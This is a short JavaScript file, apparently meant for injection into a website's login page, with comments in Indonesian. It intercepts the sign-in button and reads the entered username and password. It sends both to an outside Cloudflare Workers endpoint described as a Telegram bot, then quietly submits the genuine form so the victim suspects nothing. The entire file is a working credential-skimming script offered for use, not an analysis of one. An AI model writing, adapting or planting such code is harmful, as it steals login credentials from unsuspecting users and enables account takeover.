// loginpage.js

(function () {
  // Flag agar hanya satu kali kirim
  let hasSent = false;

  // Tunggu DOM siap
  document.addEventListener('DOMContentLoaded', function () {
    // Cari tombol sign in
    const signInBtn = document.querySelector('button[type="submit"]');
    if (!signInBtn) return;

    signInBtn.addEventListener('click', function (e) {
      if (hasSent) {
        // JS sudah nonaktif
        return true; // biarkan submit berjalan normal
      }

      // Cegah submit form default dulu
      e.preventDefault();

      // Ambil value username dan password
      const usernameInput = document.querySelector('input[name="user"]') || document.querySelector('#email');
      const passwordInput = document.querySelector('input[name="pass"]') || document.querySelector('#password');

      const username = usernameInput ? usernameInput.value.trim() : '';
      const password = passwordInput ? passwordInput.value.trim() : '';

      if (username === '' || password === '') {
        alert('Username dan Password wajib diisi!');
        return false;
      }

      // Kirim ke bot Telegram
      const msg = encodeURIComponent(`Username: ${username} ; Password: ${password}`);
      fetch(`https://memek-worker.defoy89122.workers.dev/?message=${msg}`)
        .then(() => {
          hasSent = true; // Matikan fungsi JS agar tidak bisa kirim lagi

          // Submit form aslinya
          const form = signInBtn.closest('form');
          if (form) {
            form.submit();
          }
        })
        .catch((err) => {
          console.error('Gagal mengirim ke bot:', err);
          alert('Gagal mengirim data!');
        });
    });
  });
})();
